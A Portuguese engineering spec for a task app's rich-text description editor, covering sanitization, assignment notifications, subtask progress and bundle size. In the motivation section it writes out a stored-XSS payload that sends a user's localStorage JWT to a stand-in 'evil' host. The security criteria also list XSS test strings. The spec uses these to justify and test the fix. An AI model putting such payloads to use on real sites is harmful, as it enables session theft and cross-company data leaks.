# Spec: workflow-v2 R1 — A tarefa como superfície de trabalho

**Status:** In Review
**Autor:** Nicolas (via spec-driven, modo 3)
**Criado em:** 2026-07-29
**Última atualização:** 2026-07-29
**Versão:** 0.1
**Épico:** [workflow-v2](./epicos/workflow-v2.md)
**Repos:** `work-flow` (frontend) + `workflow-api` (backend)

---

## Visão Geral

A tarefa é o átomo do work-flow e hoje é a superfície mais fraca: a descrição é texto plano escrito num `<textarea>` e renderizada com `v-html` sem sanitizar, as subtarefas são somente-leitura, ser designado a uma tarefa não notifica ninguém, e o app inteiro chega ao usuário num chunk de 3,39 MB. Esta rodada resolve os quatro, nas duas pontas.

## Motivação

O que custa não fazer:

1. **XSS armazenado com cadeia completa até o token.** Qualquer WORKER escreve `<img src=x onerror="fetch('//evil/?t='+localStorage.token)">` numa descrição; o script roda no navegador de todo colega que abrir a tarefa; o JWT vive em `localStorage`, vale 7 dias, não tem revogação e carrega **todas as empresas do usuário**. Roubar o token de um colega vaza dados de empresa em que o atacante nem participa. Não há CSP para conter a exfiltração.
2. **A descrição não serve para descrever trabalho.** Sendo texto plano renderizado como HTML sem `pre-wrap`, uma lista de critérios de aceitação digitada com quebras de linha vira um parágrafo grudado. O campo existe e não é usável para o que ele existe.
3. **Trabalho designado em silêncio.** Ser posto como responsável de uma tarefa não gera notificação. A pessoa descobre quando abre o board, se abrir. O sino (`InboxBell`) e o `NotificationService` já existem e já funcionam para troca de status.
4. **Primeira impressão.** 3,39 MB de JS em chunk único, zero rota lazy, num produto cujo público declarado inclui 50+ em máquina fraca ([didactic-overhaul](./didactic-overhaul.md)).

---

## Research Findings

**Stack:** Vue 3.5 · Vite 7 · TS 5.9 · Vuetify 4 + reka-ui 2 · Pinia 3 · Vue Query 5 · vue-router 5 · TipTap 3.28 (23 extensões instaladas) · lucide-vue-next · tokens em [plugins/tokens.ts](../../src/plugins/tokens.ts) · API NestJS 11 + Prisma + Postgres (Supabase), deploy Railway

### O que já existe e vai ser reaproveitado

| Ativo | Onde | Uso na R1 |
|---|---|---|
| `useNoteEditor` | `src/features/notes/composables/useNoteEditor.ts` | **Molde** do editor de descrição. O de descrição é um subconjunto: sem slash menu, sem tabela, sem imagem, sem details, sem code block, sem text-align, sem color/highlight |
| `NoteBubbleMenu` | `src/features/notes/components/NoteBubbleMenu.vue` | Molde do bubble menu, inclusive o modo de link inline (input + aplicar + cancelar) |
| `TipTapToolbar` | `src/components/ui/TipTapToolbar.vue` | Toolbar tokenizada com prop `groups` e modo `bare` para uso dentro de popover. Já resolve o problema de reatividade do `Editor` por prop (contador ligado em `transaction`/`selectionUpdate`) |
| `note-content.css` | `src/features/notes/styles/note-content.css` | Molde da folha de prosa. A da tarefa é própria (escala menor), não a mesma |
| `renderHtml()` | `src/composables/useMarkdownRenderer.ts:56` | Sanitização de HTML na leitura. Já é o padrão do repo e está documentado como tal |
| `useActivityDetail` | `src/features/tasks/useActivityDetail.ts` | Camada de gravação: estado **por campo**, update otimista com rollback só das chaves tocadas, retry por campo, `waitForIdle()` antes de fechar o painel. `saveFields('description', ...)` já existe e não muda |
| `InlineEditText` | `src/components/ui/InlineEditText.vue` | Contrato a imitar: `defineExpose({ flush, reset, dirty })`. `TaskDetailPanel.close()` chama `descriptionField.flush()` — o componente novo mantém a mesma superfície e o `close()` não muda |
| `SaveStatus` + `save-state.ts` | `src/components/ui/` | Indicador honesto de autosave, já consumido pelo painel |
| `NotificationService.createForUsers` | `workflow-api/src/notification/notification.service.ts:32` | Notificação em lote, best-effort, com emissão realtime por usuário. Já usada por `notifyStatusChange` |
| `activity-events.ts` + `emitActivityChange` | `workflow-api/src/activity/` | Realtime de atividade **já completo** (create, update, delete, anexo). Nada a fazer aqui |
| `motion-v` | instalado, zero uso | Física de mola do anel de progresso e da entrada do painel |

### Descobertas que mudam o plano original

1. **Não há migration nesta rodada.** `Activity.description` já é `TEXT` no Postgres (`prisma/migrations/20260309181914_init_repo/migration.sql`: `"description" TEXT`), sem limite de tamanho. Prisma mapeia `String` para `text` em Postgres por padrão. HTML rico cabe hoje. O DTO tem apenas `@IsString() @IsOptional()`, sem `@MaxLength`.
2. **O realtime de atividade não é uma lacuna.** A auditoria (`docs/EVOLUCAO.md`, Problema 7) diz "1 evento de 15 caminhos". Foi resolvido depois: `emitActivityChange` é chamado em create, update, delete, upload e delete de anexo, mais um segundo evento para o board de origem quando a tarefa troca de mês. O front consome com dedupe por `updatedAt`, filtro por empresa ativa e refresh na volta do foco. **O residual real** é o feed não gravar no `update` e a designação não notificar.
3. **`useTasks.ts` é 180 linhas de dados mock** (`Empresa A`, `João Silva`, datas de 2024) importado por `TasksView.vue:88` (chamada `useTasks()` de retorno descartado) e `TaskDetailsView.vue:104` (usa só `companies`, que é mock). Nenhuma tela consome dado real dele.
4. **`@vueuse/motion` está registrado como plugin em `main.ts:20` e a diretiva `v-motion` nunca é usada** em nenhum `.vue`. `motion-v` também tem zero uso. Duas libs de animação instaladas, zero animação por lib.
5. **`docs/EVOLUCAO.md` não é indexado pelo RAG**, então `npm run spec:query` nunca o devolve. É o documento mais importante do repo para planejamento.

### Padrões a seguir

- Zero hex em componente: só tokens de `plugins/tokens.ts`
- `lucide-vue-next` para todo ícone novo; nunca `mdi-*`
- Zero `v-dialog`; overlay é `AppDialog`
- Sem em-dash em copy visível
- Sem neon: nenhum glow saturado, nenhuma sombra colorida forte, nenhum gradiente ácido
- Todo `v-html` passa por sanitizador, com `<!-- eslint-disable-next-line vue/no-v-html -->` e comentário dizendo por onde passou
- `prefers-reduced-motion: reduce` respeitado em toda animação nova

### Breaking Changes

1. **`Activity.description` passa a conter HTML.** Consumidores auditados:
   - `TaskDetailsView.vue:751` e `:1355` (`v-html` cru) — **corrigidos nesta rodada**
   - `TaskDetailsView.vue:793` (`{{ task.description }}` da subtarefa na lista) — passaria a mostrar tags cruas. **Corrigido nesta rodada** com resumo em texto puro
   - `activity.service.ts:97` → `ai.suggestTaskUpgrade(title, description)`: a IA passa a receber HTML. Mitigação: o `HtmlSanitizerService` expõe `toPlainText()` e o service o usa antes de mandar para a IA
   - `AI`/RAG: `Embedding` indexa `ACTIVITY`. Tags de HTML poluiriam o embedding. Mitigação: mesma `toPlainText()`. **Verificar o ponto de indexação como parte de T9**
   - Nenhum outro consumidor: grep de `\.description` fora de `features/tasks` e `components/tasks` não encontra leitura de descrição de atividade
2. **`@vueuse/motion` removido.** `MotionPlugin` sai de `main.ts`. Zero consumidor (nenhuma diretiva `v-motion` no repo).
3. **`useTasks.ts` deletado.** Dois importadores, ambos ajustados na mesma task.

---

## Riscos e Mitigações

| Nível | Risco | Mitigação |
|---|---|---|
| **Alto** | A allowlist do sanitizador do backend rejeita HTML legítimo do TipTap e o usuário perde formatação ao salvar, sem aviso | A allowlist é derivada **da lista de extensões habilitadas** em `useTaskDescriptionEditor`, não escrita à mão. AC de ida-e-volta: uma tarefa com **cada** marca e nó habilitado sobrevive a `PATCH` + `GET` sem perda. Inclui o markup completo do `TaskItem` (`ul[data-type=taskList] > li[data-type=taskItem][data-checked] > label > input[type=checkbox] + span` e `div`), que é o mais fácil de esquecer |
| **Alto** | Autosave de HTML entra em laço: `onUpdate` dispara a cada tecla, o `PATCH` responde, a resposta entra no cache, o watcher reescreve o conteúdo do editor, o `setContent` dispara `onUpdate` de novo | O editor **nunca** reage à própria resposta. O watcher de `modelValue` só aplica `setContent` quando (a) o editor não está focado **e** (b) não há rascunho sujo **e** (c) o HTML normalizado de entrada difere do atual. Mesma regra do `InlineEditText.vue:116-123`, que já está em produção |
| **Médio** | Descrição legada em texto plano interpretada como HTML corrompe conteúdo que contenha `<` ou `&` (ex.: `if (a < b)` ou `Ana & Bia`) | `plainToHtml()` escapa `&`, `<`, `>` **antes** de converter quebras de linha. A detecção de legado é por regex de tag conhecida, e o caminho padrão em caso de dúvida é tratar como **texto plano** (mais seguro: escapa em vez de executar) |
| **Médio** | Esvaziar a descrição não persiste, porque o TipTap emite `<p></p>` para vazio e isso não é string vazia | `normalizeHtml()` reduz `<p></p>`, `<p><br></p>` e afins para `''` antes de comparar e antes de gravar. AC explícito: apagar tudo e recarregar mostra "Sem descrição" |
| **Médio** | Lazy loading de rotas quebra o `AppShell` (que escolhe a variante por `route.name`) ou os guards | T10 exercita as 3 variantes de shell mais um deep link direto por URL (`/tasks/:month/:taskId?company=`) antes de fechar. `nprogress` já está ligado no router e cobre a espera do chunk |
| **Baixo** | Notificação de designação vira spam quando alguém remexe responsáveis várias vezes | Notifica só o **delta de entrada** (quem não estava na lista antes), nunca a lista inteira, e nunca o próprio ator |

---

## Requisitos Não-Funcionais

- **Segurança:** todo HTML de descrição é sanitizado na escrita (API, `sanitize-html` com allowlist fechada) **e** na leitura (front, DOMPurify). `href` de link limitado a `http`, `https` e `mailto`; `javascript:` e `data:` rejeitados. Nenhum atributo de evento (`on*`) e nenhum `style` sobrevive.
- **Performance:** chunk inicial de JS abaixo de 900 KB (baseline: 3,39 MB em chunk único). Medido por `npm run build`.
- **Acessibilidade:** o painel de detalhe prende o foco (Tab e Shift+Tab circulam dentro dele) e devolve o foco ao elemento que o abriu ao fechar. O bubble menu é alcançável por teclado. Toda animação nova respeita `prefers-reduced-motion`.
- **Observabilidade:** eventos de produto no PostHog para os fluxos tocados, com camada tipada (nada de string solta em componente).
- **Compatibilidade:** descrição legada em texto plano abre sem erro e sem perder conteúdo. Tema claro e escuro.

---

## User Stories

- Como **worker**, quero escrever a descrição da tarefa com negrito, lista e checklist no próprio campo, sem abrir editor nem painel de estilo, para registrar critérios de aceitação de forma legível.
- Como **worker**, quero ser avisado quando alguém me designa uma tarefa, para não descobrir por acaso.
- Como **worker**, quero marcar subtarefa como feita direto no painel e ver o progresso, para não precisar abrir a página cheia.
- Como **admin**, quero que a descrição escrita por um colega não consiga executar script no meu navegador.
- Como **usuário em máquina fraca**, quero que a tela de login apareça rápido.

---

## Acceptance Criteria

### Descrição rica fundida

- [ ] **Given** o painel de detalhe aberto **When** seleciono um trecho da descrição **Then** aparece um menu flutuante com negrito, itálico, sublinhado, riscado, código inline, link, lista com marcador, lista numerada e checklist, e nada mais
- [ ] **Given** o editor de descrição **When** procuro por UI de blocos **Then** não existe: sem menu de "/", sem alça de arrastar, sem seletor de tipo de bloco, sem painel de personalização de texto, sem botão de tabela, imagem, título ou alinhamento
- [ ] **Given** o cursor no início de uma linha vazia **When** digito `- ` ou `1. ` ou `[] ` **Then** a lista correspondente é criada (entrada por markdown do StarterKit), porque isso é formatação inline e não UI de bloco
- [ ] **Given** texto selecionado **When** aperto `Ctrl/Cmd + B`, `I`, `U` ou `Shift+Ctrl+X` **Then** a marca correspondente é aplicada
- [ ] **Given** texto selecionado **When** aperto `Ctrl/Cmd + K` **Then** o menu flutuante entra em modo link com o campo focado e o texto selecionado
- [ ] **Given** que digitei na descrição **When** paro de digitar por 800ms **Then** o `SaveStatus` do painel passa por "Salvando…" e chega em "Salvo às HH:MM"
- [ ] **Given** que digitei na descrição **When** clico fora do editor **Then** a gravação acontece na hora, sem esperar o debounce
- [ ] **Given** que digitei na descrição **When** fecho o painel pelo X ou por Esc **Then** o conteúdo é gravado antes do painel sair (via `flush()` + `waitForIdle()` já existentes)
- [ ] **Given** que formatei a descrição e saí sem apertar nenhum botão de salvar **When** recarrego a página e reabro a tarefa **Then** o conteúdo formatado está lá, com a formatação intacta
- [ ] **Given** a descrição preenchida **When** apago todo o conteúdo e recarrego **Then** o painel mostra o placeholder e a página cheia mostra "Sem descrição" (o `<p></p>` do TipTap vazio não é gravado como conteúdo)
- [ ] **Given** o formulário de nova atividade **When** escrevo a descrição **Then** uso o mesmo editor fundido, e a tarefa nasce com a formatação que digitei
- [ ] O contador de caracteres aparece no rodapé do editor e conta **texto**, não markup

### Retrocompatibilidade

- [ ] **Given** uma tarefa cuja descrição é texto plano com quebras de linha **When** abro a tarefa **Then** abre sem erro, o conteúdo aparece **com as quebras preservadas** (hoje elas somem) e nada é perdido
- [ ] **Given** uma tarefa cuja descrição é texto plano contendo `if (a < b) && x` **When** abro a tarefa **Then** o texto aparece literal, sem interpretar `<b>` como tag e sem sumir com nada
- [ ] **Given** uma descrição legada **When** não edito nada **Then** nenhum `PATCH` é disparado (abrir a tarefa não reescreve o campo)

### Segurança

- [ ] **Given** um `PATCH /activity/:id` com `description: "<img src=x onerror=alert(1)>"` **When** faço `GET` da mesma atividade **Then** o campo gravado não contém `onerror` (sanitizado **no servidor**)
- [ ] **Given** um `PATCH` com `description: "<script>alert(1)</script>texto"` **Then** o gravado é `texto`, sem a tag
- [ ] **Given** um `PATCH` com `description: "<a href=\"javascript:alert(1)\">x</a>"` **Then** o `href` não sobrevive
- [ ] **Given** uma descrição já suja no banco (gravada antes desta rodada) **When** abro a tarefa na página cheia ou no painel **Then** o script não executa, porque a leitura também sanitiza
- [ ] `grep -n "v-html" src/features/tasks/TaskDetailsView.vue` mostra só usos cujo valor passou por `renderHtml`
- [ ] **Ida-e-volta por extensão:** uma descrição contendo negrito, itálico, sublinhado, riscado, código inline, link `https`, parágrafo, quebra de linha forçada, citação, lista com marcador, lista numerada e checklist (marcada e desmarcada) sobrevive a `PATCH` + `GET` sem perda de nenhum dos doze

### Designação e feed

- [ ] **Given** uma tarefa sem responsáveis **When** designo o usuário B **Then** B recebe notificação in-app com título da tarefa e link para ela, e o sino de B atualiza sem refresh (socket)
- [ ] **Given** uma tarefa com responsáveis [B] **When** salvo responsáveis [B, C] **Then** só C é notificado
- [ ] **Given** que eu me designo a mim mesmo **Then** não recebo notificação
- [ ] **Given** que edito título, prazo, prioridade ou responsáveis **Then** aparece uma linha na timeline da empresa (`GET /feed`) com o verbo `updated` e um resumo do que mudou
- [ ] Falha ao notificar ou ao gravar feed **não** derruba o `PATCH` (best-effort, igual ao `notifyStatusChange`)

### Subtarefas no painel

- [ ] **Given** uma tarefa com 4 subtarefas, 1 concluída **When** abro o painel **Then** vejo um anel de progresso mostrando 25% e o texto "1 de 4"
- [ ] **Given** o painel aberto **When** clico no círculo de uma subtarefa **Then** ela alterna entre pendente e concluída, o anel se move com física de mola, e a mudança persiste
- [ ] **Given** que a alternância falha na rede **Then** o estado visual volta ao anterior e aparece um toast de erro
- [ ] **Given** `canEdit === false` **Then** os círculos ficam desabilitados e o anel continua legível

### Layout e a11y

- [ ] A prosa da descrição usa `task-content.css` tokenizado, legível nos temas claro e escuro, com hierarquia visível entre parágrafo, lista, checklist, citação e código
- [ ] **Given** o painel aberto **When** navego por Tab até o fim **Then** o foco volta para o primeiro elemento do painel, sem alcançar o conteúdo atrás
- [ ] **Given** o painel aberto por clique num card **When** fecho o painel **Then** o foco volta para o card que o abriu
- [ ] `prefers-reduced-motion: reduce` desliga a mola do anel e a entrada do painel
- [ ] Nenhum em-dash em copy nova; nenhum `v-dialog` novo; nenhum hex em componente novo

### Performance e higiene

- [ ] Chunk inicial de JS abaixo de 900 KB no `npm run build` (baseline 3,39 MB), com as rotas em chunks próprios
- [ ] As 3 variantes de shell (`command`, `focus`, `canvas`) carregam e navegam com as rotas lazy
- [ ] Deep link direto por URL para `/tasks/:month/:taskId?company=` funciona com as rotas lazy
- [ ] `src/features/tasks/useTasks.ts` não existe mais e `npm run type-check` passa
- [ ] `qrcode`, `sortablejs` e `@vueuse/motion` fora do `package.json`; `motion-v` em uso real
- [ ] `npm run spec:query "evolução do produto"` devolve `docs/EVOLUCAO.md`

### Analytics

- [ ] Existe `src/composables/useAnalytics.ts` com união de tipos dos eventos; nenhum componente chama `posthog.capture` com string solta
- [ ] Os eventos `task_description_edited`, `task_created`, `task_status_changed`, `task_assigned`, `subtask_toggled` são emitidos nos fluxos correspondentes com as propriedades declaradas na spec
- [ ] O evento de ativação está definido e documentado nesta spec

---

## Estratégia de Testes

O repo **não tem suíte de testes** (verificado: sem `vitest`, sem `jest`, sem `.github/workflows`). Criar infraestrutura de teste é item da R2.10, não desta rodada. Portanto: os testes desta rodada são **manuais e por API**, descritos passo a passo, mais os gates determinísticos que existem.

### Automatizados (o que existe hoje)

- [ ] `npm run type-check` limpo nos dois repos (`vue-tsc --build` no front, `tsc` no back)
- [ ] `npm run lint` limpo no front (oxlint + eslint)
- [ ] `npm run build` limpo, com o tamanho do chunk inicial registrado no relatório

### Por API (`curl`, contra a API local)

- [ ] `PATCH /activity/:id` com cada um dos 5 payloads maliciosos dos AC de segurança, conferindo o `GET` seguinte
- [ ] Ida-e-volta das 12 marcas/nós num único `PATCH`, comparando o HTML devolvido
- [ ] `PATCH` de responsáveis [B] → [B, C], conferindo `GET /inbox` de C (1 notificação) e de B (nenhuma nova)
- [ ] `GET /feed` depois de um `PATCH` de título, conferindo a linha nova

### Manuais (happy path, o passo a passo pedido)

- [ ] Abrir uma tarefa pelo card do board (painel abre sobre o board)
- [ ] Selecionar um trecho, aplicar negrito pelo menu flutuante
- [ ] Escrever uma lista de 3 itens com `- ` e uma checklist com `[] `
- [ ] Colar um link e aplicar com `Ctrl+K`
- [ ] **Sair sem salvar explicitamente** (clicar fora, depois fechar o painel com Esc)
- [ ] Recarregar a página (F5)
- [ ] Reabrir a mesma tarefa: **o conteúdo formatado está presente**, com lista e checklist intactas
- [ ] Marcar uma subtarefa no painel, ver o anel se mover, recarregar e conferir que persistiu
- [ ] Repetir a abertura da tarefa nos temas claro e escuro, com screenshot de cada

### Manuais (erro)

- [ ] Com o DevTools em modo offline: digitar na descrição, esperar o debounce. Esperado: `SaveStatus` mostra erro com "Tentar de novo", **o texto digitado continua na tela**, e voltar a rede + clicar em "Tentar de novo" grava
- [ ] Fechar o painel com a rede caída: o texto não é perdido do editor até a gravação resolver (o `waitForIdle` tem timeout de 4s e o erro aparece em toast)

### Regressão

- [ ] Tarefa com descrição legada em texto plano: abre, mostra quebras, e **não** dispara `PATCH` ao abrir
- [ ] Arrastar card no kanban continua funcionando (realtime `activity:moved` intacto)
- [ ] Board de outra empresa no `/board` continua abrindo o painel com o `x-company-id` correto
- [ ] Notas continuam funcionando: `useNoteEditor` não foi tocado
- [ ] As 3 variantes de shell navegam com as rotas lazy
- [ ] `/report/:companyId` (bug report público) e `/public/*` continuam abrindo (rotas lazy sem shell)

---

## Arquivos Impactados

### Frontend (`work-flow`)

| Arquivo | Ação | Descrição |
|---|---|---|
| `src/features/tasks/composables/useTaskDescriptionEditor.ts` | Criar | Configuração única do editor fundido. Subconjunto do StarterKit + Placeholder + TaskList/TaskItem + CharacterCount. **Sem** SlashCommand, tabela, imagem, details, code block, text-align, color, highlight |
| `src/features/tasks/components/TaskDescriptionEditor.vue` | Criar | Componente do campo. Debounce 800ms, flush no blur, `defineExpose({ flush, reset, dirty })` imitando `InlineEditText`. Contador de caracteres. Estados via `SaveStatus` do pai |
| `src/features/tasks/components/TaskDescriptionBubbleMenu.vue` | Criar | Menu flutuante inline + modo link. Reusa `TipTapToolbar` com `groups` restrito |
| `src/features/tasks/styles/task-content.css` | Criar | Prosa da descrição, tokenizada, escala de tarefa (menor que a de nota). Usada pelo editor **e** pela leitura na página cheia |
| `src/features/tasks/description-html.ts` | Criar | `isHtmlish()`, `plainToHtml()`, `normalizeHtml()`, `toEditorHtml()`, `htmlToPlainText()`. Ponto único de tradução entre o campo do banco e o editor |
| `src/features/tasks/components/SubtaskProgress.vue` | Criar | Anel de progresso com mola (`motion-v`) + contador "N de M" |
| `src/features/tasks/components/TaskDetailPanel.vue` | Modificar | Trocar `InlineEditText multiline` por `TaskDescriptionEditor`; subtarefas com toggle e anel; armadilha de foco; devolver foco ao fechar |
| `src/features/tasks/TaskDetailsView.vue` | Modificar | Corrigir os dois `v-html` (`:751`, `:1355`) com `renderHtml`; resumo em texto puro na lista de subtarefas (`:793`); trocar os 3 `<textarea>` de descrição pelo editor; remover import de `useTasks` |
| `src/components/tasks/TaskForm.vue` | Modificar | Trocar o `<textarea>` de descrição pelo editor fundido |
| `src/features/tasks/useTasks.ts` | **Deletar** | 180 linhas de mock |
| `src/features/tasks/index.ts` | Modificar | Remover o export de `useTasks` |
| `src/features/tasks/TasksView.vue` | Modificar | Remover a chamada morta `useTasks()`; instrumentar `task_created` |
| `src/composables/useAnalytics.ts` | Criar | Camada tipada sobre o PostHog. União de tipos dos eventos + propriedades |
| `src/composables/usePostHog.ts` | Modificar | Expor `capture` tipado e `identify`; manter o guard de localhost |
| `src/router/index.ts` | Modificar | Todas as rotas em `() => import(...)` |
| `vite.config.ts` | Modificar | `manualChunks` separando vendor de editor, gráficos e Vuetify |
| `src/main.ts` | Modificar | Remover `MotionPlugin` e o import de `@vueuse/motion` |
| `package.json` | Modificar | Remover `qrcode`, `sortablejs`, `@vueuse/motion` |
| `scripts/spec-rag/build-index.mjs` | Modificar | Indexar `docs/**/*.md`, não só `docs/specs/` |
| `src/CLAUDE.md` | Modificar | Editor de descrição de tarefa; decisão de motion; `useTasks` removido; `/tickets` (afirmação falsa hoje) |

### Backend (`workflow-api`)

| Arquivo | Ação | Descrição |
|---|---|---|
| `src/shared/security/html-sanitizer.service.ts` | Criar | `sanitizeRichText(html)` com allowlist derivada das extensões, e `toPlainText(html)` |
| `src/shared/security/rich-text.allowlist.ts` | Criar | Allowlist como dado, com comentário ligando cada entrada à extensão do TipTap que a produz |
| `src/shared/shared.module.ts` | Criar ou modificar | Exportar o `HtmlSanitizerService` |
| `src/activity/activity.service.ts` | Modificar | Sanitizar `description` no `create` e no `update`; `toPlainText` antes de mandar para a IA (`:97`); notificar o delta de responsáveis; `feed.record` no `update` |
| `src/activity/activity.module.ts` | Modificar | Importar o módulo do sanitizador |
| `package.json` | Modificar | Adicionar `sanitize-html` + `@types/sanitize-html` |

---

## Tasks Técnicas

- [ ] **T1** — Backend: `sanitize-html` instalado; `rich-text.allowlist.ts` + `HtmlSanitizerService` com `sanitizeRichText()` e `toPlainText()`; exportado por módulo
- [ ] **T2** — Backend: aplicar o sanitizador no `create` e no `update` de `Activity`; usar `toPlainText()` antes do `ai.suggestTaskUpgrade` e no ponto de indexação de embedding *(depende de: T1)*
- [ ] **T3** — Backend: notificar o **delta de entrada** de responsáveis (nunca o ator) e gravar `feed.record` em toda edição, ambos best-effort *(depende de: T1)*
- [ ] **T4** — Front: `description-html.ts` com `isHtmlish`, `plainToHtml` (escapando `& < >` antes das quebras), `normalizeHtml` (vazio do TipTap → `''`), `toEditorHtml`, `htmlToPlainText`
- [ ] **T5** — Front: `useTaskDescriptionEditor` + `task-content.css` *(depende de: T4)*
- [ ] **T6** — Front: `TaskDescriptionBubbleMenu` (formatação inline + modo link + `Ctrl+K`) *(depende de: T5)*
- [ ] **T7** — Front: `TaskDescriptionEditor.vue` com debounce, flush no blur, guarda anti-laço no watcher, contador de caracteres e `defineExpose({ flush, reset, dirty })` *(depende de: T5, T6)*
- [ ] **T8** — Front: plugar no `TaskDetailPanel` (substituindo o `InlineEditText multiline`) *(depende de: T7)*
- [ ] **T9** — Front: `TaskDetailsView` — corrigir os dois `v-html`, resumo em texto puro da subtarefa, trocar os `<textarea>` pelo editor *(depende de: T7)*
- [ ] **T10** — Front: `TaskForm.vue` com o editor fundido *(depende de: T7)*
- [ ] **T11** — Front: `SubtaskProgress.vue` (anel com mola via `motion-v`) + toggle de subtarefa no painel *(depende de: T8)*
- [ ] **T12** — Front: armadilha de foco no `TaskDetailPanel` + devolução do foco ao fechar
- [ ] **T13** — Front: `useAnalytics.ts` tipado + instrumentar os 5 eventos + definir o evento de ativação
- [ ] **T14** — Front: rotas lazy + `manualChunks`; medir o chunk antes e depois
- [ ] **T15** — Higiene: deletar `useTasks.ts` e seus 2 importadores; remover `qrcode`, `sortablejs`, `@vueuse/motion` e o `MotionPlugin`
- [ ] **T16** — RAG: indexar `docs/**/*.md`; rodar `npm run spec:rag`
- [ ] **T17** — Testes da Estratégia (API por `curl`, manuais nos dois temas com screenshot, regressão)
- [ ] **T18** — Atualizar `src/CLAUDE.md` e o Change Log desta spec

---

## Considerações de Arquitetura

- **Decisão A1: o editor de descrição é um composable próprio, não uma opção do `useNoteEditor`.**
  **Motivo:** o de notas é um editor de documento (blocos, tabela, details, slash menu). O da tarefa é um campo de formulário com formatação inline. Um único composable com flags de desligar acumularia condicional para sempre e arriscaria vazar bloco novo de nota para dentro da tarefa a cada evolução da P3/P4.
  **Alternativa rejeitada:** `useNoteEditor({ variant: 'task' })`.

- **Decisão A2: superfície única, formatação inline. Zero UI de bloco.**
  **Motivo:** pedido explícito ("puro fusue"). O que fica: negrito, itálico, sublinhado, riscado, código inline, link, lista com marcador, lista numerada, checklist, citação. O que sai: slash menu, alça de arrastar, seletor de tipo de bloco, título, tabela, imagem, alinhamento, cor, marca-texto, bloco de código, details. Entrada por markdown (`- `, `1. `, `[] `, `> `) **fica**, porque é digitação, não UI.
  **Alternativa rejeitada:** toolbar fixa acima do campo. Ocupa altura permanente num painel que já é denso e é o oposto de "fundido".

- **Decisão A3: retrocompatibilidade na leitura, sem migration de dados.**
  **Motivo:** não existe ambiente de desenvolvimento separado (EVOLUCAO 1.1, aberto). Rodar `UPDATE` de conteúdo em cima de produção nesta rodada é risco desnecessário para um problema que a leitura resolve. Ganho de brinde: a quebra de linha que hoje some passa a aparecer, em toda descrição legada, sem tocar em nenhuma linha do banco.
  **Alternativa rejeitada:** migration convertendo texto plano em HTML.

- **Decisão A4: sanitizar nas duas pontas, com allowlist derivada da configuração do editor.**
  **Motivo:** o front protege contra dado histórico sujo (que já está no banco), o backend protege contra qualquer outro consumidor (microserviço de QR, API pública da Onda 4, copiloto). Derivar a allowlist da lista de extensões é o que impede o modo de falha mais provável: alguém habilita uma extensão no editor, o backend cala a saída, e o usuário perde formatação sem entender por quê.
  **Alternativa rejeitada:** sanitizar só no front (o backend continuaria aceitando `<script>` de qualquer cliente).

- **Decisão A5: `motion-v` fica, `@vueuse/motion` sai.**
  **Motivo:** as duas estavam instaladas com zero uso. `motion-v` é o port Vue oficial do Motion, com API de componente tree-shakeable e mola de verdade, e é o que atende a direção visual escolhida ("profundo + movimento": anel de progresso com mola). `@vueuse/motion` exige plugin global registrado no `main.ts` para uma diretiva que ninguém usa.
  **Alternativa rejeitada:** manter as duas "para uso futuro". Foi exatamente essa decisão, na Fase P do design system, que produziu as duas órfãs.

- **Decisão A6: `htmlToPlainText` no backend, não no front, para IA e embedding.**
  **Motivo:** quem consome descrição para IA é o backend. Mandar HTML para o embedding polui o vetor com nomes de tag; mandar para o `suggestTaskUpgrade` gasta token com markup.

---

## Plano de Rollout

Ordem obrigatória, porque a rodada muda formato de dado:

1. **Backend primeiro** (T1, T2, T3). É aditivo e não breaking: sanitizar texto plano é no-op, e um front antigo mandando texto plano continua funcionando.
2. **Front depois** (T4 a T15). Só faz sentido gravar HTML depois que a API sabe sanitizá-lo.
3. Sem feature flag. O fallback de leitura cobre os dois formatos em qualquer ordem de deploy, e o pior caso de inverter a ordem (front antes) é HTML gravado sem sanitização no servidor por algumas horas, com o front ainda sanitizando na leitura.
4. Sem migration. Nenhum `ALTER TABLE`, nenhum backfill.

## Plano de Rollback

- **Front:** reverter o commit e redeploy. As descrições já gravadas em HTML continuam legíveis, porque o `v-html` corrigido (com `renderHtml`) é o mesmo caminho e a versão anterior mostrava HTML cru **sem sanitizar**. Atenção: reverter o front **reabre o XSS**. Se o rollback for necessário, reverter tudo **menos** a correção dos dois `v-html` (é uma edição isolada de 2 linhas).
- **Backend:** reverter o commit e redeploy. O `description` volta a ser gravado cru; nada quebra na leitura.
- **Sem migration**, então não há procedimento de banco.
- **Dado gravado em HTML durante a janela:** permanece e continua sendo renderizado corretamente por qualquer versão do front que use `renderHtml`. Nenhum dado é perdido por rollback.

---

## Observabilidade

Camada tipada em `src/composables/useAnalytics.ts`. Nenhum `posthog.capture` com string solta em componente.

| Evento | Quando | Propriedades |
|---|---|---|
| `task_created` | `POST /activity` retorna | `has_description`, `has_assignees`, `has_due_date`, `priority` |
| `task_description_edited` | primeira gravação bem-sucedida de descrição por sessão de edição | `char_count`, `used_formatting` (bool), `was_legacy_plain` (bool) |
| `task_status_changed` | `PATCH /activity/:id/status` retorna | `from`, `to`, `surface` (`panel` \| `board` \| `page`) |
| `task_assigned` | gravação de responsáveis com delta de entrada | `assignee_count`, `assigned_self` |
| `subtask_toggled` | toggle de subtarefa | `to_status`, `surface` |

**Evento de ativação (definido nesta rodada, medido a partir dela):**
uma empresa está **ativada** quando, dentro de 7 dias da criação, teve ao menos **3 `task_created`** e **1 `task_status_changed` para `DONE`** por ao menos **2 usuários distintos**. É o menor sinal que separa "alguém abriu o produto" de "um time começou a trabalhar nele". Fica registrado aqui porque a Onda 4 (precificação) depende dele e hoje o número não existe.

Não entra nesta rodada: Sentry (R2), custo de IA por empresa (Onda 4).

---

## Definition of Done

- [ ] Todos os acceptance criteria verificados um a um, com veredito **Atendido** ou **Não atendido (motivo)**
- [ ] Testes da Estratégia executados (API por `curl`, manuais nos dois temas, regressão)
- [ ] `npm run type-check` e `npm run lint` limpos no front; `tsc` limpo na API
- [ ] `npm run build` limpo, com tamanho do chunk inicial antes e depois no relatório
- [ ] Fluxo exercitado de ponta a ponta: tarefa aberta, descrição formatada, saída sem salvar, F5, conteúdo presente
- [ ] Screenshots antes/depois nos temas claro e escuro das telas tocadas
- [ ] Nenhum em-dash em copy nova; nenhum `v-dialog` novo; nenhum hex em componente novo; nada de neon
- [ ] Breaking changes documentadas e consumidores ajustados
- [ ] `src/CLAUDE.md` atualizado
- [ ] Spec com status `Concluído` + data + Change Log
- [ ] `npm run spec:rag` rodado
- [ ] **Nada commitado** sem pedido explícito

## Perguntas em Aberto

